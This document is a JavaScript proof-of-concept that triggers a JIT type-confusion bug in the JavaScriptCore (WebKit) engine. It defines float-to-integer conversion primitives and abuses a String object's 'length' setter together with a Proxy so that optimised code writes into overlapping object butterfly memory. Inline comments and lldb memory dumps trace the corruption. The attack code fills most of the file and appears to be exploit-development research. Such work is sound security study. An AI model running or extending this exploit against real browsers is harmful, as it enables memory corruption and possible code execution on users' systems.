var tmp_buf = new ArrayBuffer(8)
var f64 = new Float64Array(tmp_buf)
var u32 = new Uint32Array(tmp_buf)
var BASE = 0x100000000

function f2i(f) {
    f64[0] = f
    return u32[0] + BASE*u32[1]
}
function i2f(i) {
    u32[0] = i % BASE
    u32[1] = i / BASE
    return f64[0]
}

// This String Object structure has a non-reified static property "length".
const EVENT = new String('a');

function opt(use_event, proxy) {
    let tmp = Object.create(null); //create tmp object with __proto__ as null
    if (use_event) //whether to initialize __proto__ as string object
        tmp = Object.create(EVENT); //set tmp object as string object 

    tmp.length = 1;  // Here the compiler expects that it'll transition but at runtime it'll fail due to the setter from String Object.
    //length by default is at object butterfly address + 0x0 0xfffe000000000001
    //I believe length , and a0 - a4 will be in line properties  
    tmp.a0 = 0x1111; //inline property "Object butterfly address + 0x8 right after length address" 0xfffe000000001111
    tmp.a1 = 0x2222; //inline property "Object butterfly address + 0x10" 0xfffe000000002222
    tmp.a2 = 0x3333; //inline property "Object butterfly address + 0x18" 0xfffe000000003333
    tmp.a3 = 0x4444; //inline property "Object butterfly address + 0x20" 0xfffe000000004444
    tmp.a4 = 0x5555; //inline property "Object butterfly address + 0x28" 0xfffe000000005555
    /* lldb
x/10xg 0x12c45c180
0x12c45c180: 0x0100180000009280 0x000000804e002288
0x12c45c190: 0xfffe000000000001 0xfffe000000001111
0x12c45c1a0: 0xfffe000000002222 0xfffe000000003333
0x12c45c1b0: 0xfffe000000004444 0xfffe000000005555
0x12c45c1c0: 0x0000000000000000 0x0000000000000000
*/
    tmp.a5 = 0x6666; //out of line property "Object butterfly address - 0x18"
    /*x/10xg 0x000000804e002288-0x10
0x804e002278: 0xfffe000000006666 0x0000000000000000
0x804e002288: 0x0000000000000000 0x0000000000000000
0x804e002298: 0x0000000000000000 0x0000000000000000
0x804e0022a8: 0x0000000000000000 0x0000000000000000
0x804e0022b8: 0x0000000000000000 0x0000000000000000
*/
    proxy.set_getter_on = tmp;

    const value = tmp.a5; // ool butterfly property is set to value then returned

    return value;
}


function initialize() {
    {
        const object = Object.create(EVENT);
        Object.defineProperty(object, 'length', {value: 1, writable: true, enumerable: true, configurable: true});

        object.a0 = 1; //inline properties 
        object.a1 = 1;
        object.a2 = 1;
        object.a3 = 1;
        object.a4 = 1;
        object.a5 = 1;
    }

    {
        const object = Object.create(EVENT);

        object.a0 = 1;
        object.a1 = 1;
        object.a2 = 1;
        object.a3 = 1;
        object.a4 = 1;
        object.a5 = 1;
    }
}


function main() {
    const proxy = new Proxy({}, {
        set: (object, property, value) => {
            const tmp = {};
            tmp[26] = i2f(0x41414141); 
            //for some reason tmp[26] is pointing to value butterfly - 0x10  like so :
            /*x/10xg 0x000000802f0242c8-0x10
0x802f0242b8: 0x0000000000001234 0x0000001b0000001b
0x802f0242c8: 0x7ff8000000000000 0x7ff8000000000000
0x802f0242d8: 0x7ff8000000000000 0x7ff8000000000000
0x802f0242e8: 0x7ff8000000000000 0x7ff8000000000000
0x802f0242f8: 0x7ff8000000000000 0x7ff8000000000000
*/
//tmp = 0x9999
            value[26] = 1.1; //0x3ff199999999999a
            // remember each element indice on an object or array is worth 0x8 
            //tmp[27] = 2.3023e-320
            //object[0] for example would be stored at [butterfly + 0]
            //so value[26] should theorectically be stored at "addressof value object butterfly" + (0x8 * 26)
            //0x8 * 26 = 208 lets go there and see whats written
            /*x/10xg 0x000000802f0242c8+208
0x802f024398: 0x3ff199999999999a 0x0000000000000000
0x802f0243a8: 0x0000000000000000 0x0000000000000000
0x802f0243b8: 0x0000000000000000 0x0000000000000000
0x802f0243c8: 0x0000000000000000 0x0000000000000000
0x802f0243d8: 0x0000000000000000 0x0000000000000000
*/

            print(describe(tmp))
            //Object: 0x12c5b7e80 with butterfly 0x802f0241e8(base=0x802f0241e0) (Structure 0x300009de0:
            //[0x9de0/40416, Object, (0/6, 0/0){}, NonArrayWithDouble, Proto:0x10a025468, Leaf]), StructureID: 40416
            print(describe(value))
            //Object: 0x12c5b7e40 with butterfly 0x802f0242c8(base=0x802f0242c0) (Structure 0x300009e50:
            //[0x9e50/40528, Object, (6/6, 0/0){a0:0, a1:1, a2:2, a3:3, a4:4, a5:5}, NonArrayWithDouble, Proto:0x10a047848, Leaf]), StructureID: 40528

            return true;
        }
    });

    initialize();

    for (let i = 0; i < 1000; i++) {
        opt(/* use_event */ false, /* proxy */ 1.1);
        opt(/* use_event */ true, /* proxy */ 1.1);
    } //optimize opt function make it hot for the dfg compilation

    /*if (window.testRunner)
        testRunner.waitUntilDone();*/

    setTimeout(() => {
        const value = opt(/* use_event */ true, proxy);
        //value = tmp.a5 aka "ool property tmp butterfly - 0x10"
        // Should crash here my reasoning of guess is because tmp.a5 to compiler is looked at as a regular object sharing the same butterfly or either overlapping
        //print(describe(value))
        value = 1234; //tmp[26] indice gets overwritten here for some reason
        print(describe(value))
        /*if (window.testRunner)
            testRunner.notifyDone();*/
    }, 100);
}

main();
